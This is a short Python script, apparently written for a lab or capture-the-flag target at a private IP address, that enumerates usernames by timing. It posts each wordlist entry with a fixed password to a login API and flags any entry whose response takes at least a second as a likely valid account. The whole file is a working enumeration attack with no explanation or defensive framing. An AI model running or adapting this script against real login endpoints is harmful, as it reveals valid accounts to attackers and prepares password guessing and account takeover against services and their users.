import time
import requests
import sys

def print_percent_done(index, total, bar_len=50, title='Please wait'):
    '''
    index is expected to be 0 based index.
    0 <= index < total
    '''
    percent_done = (index+1)/total*100
    percent_done = round(percent_done, 1)

    done = round(percent_done/(100/bar_len))
    togo = bar_len-done

    done_str = '█'*int(done)
    togo_str = '░'*int(togo)
    
    print(f'\t⏳{title}: [{done_str}{togo_str}] {index}/{total} done', end='\r')

    if round(percent_done) == 100:
        print('\t✅')

file = open("wordlist.txt","r")
data = file.readlines()
print("\n")
valid = []
for i in  range(len(data)):
    start_time = time.time()
    creds = {"username":data[i],"password":"456"}
    req = requests.post("http://10.10.95.113:8080/api/user/login",creds)
    end_time = time.time()
    total_time = (end_time-start_time)

    if total_time >=1 :
        valid.append(data[i])
    else:
        print_percent_done(i,len(data))
        time.sleep(.02)


for user in valid:
    print(user+" is likely valid!")

file.close()
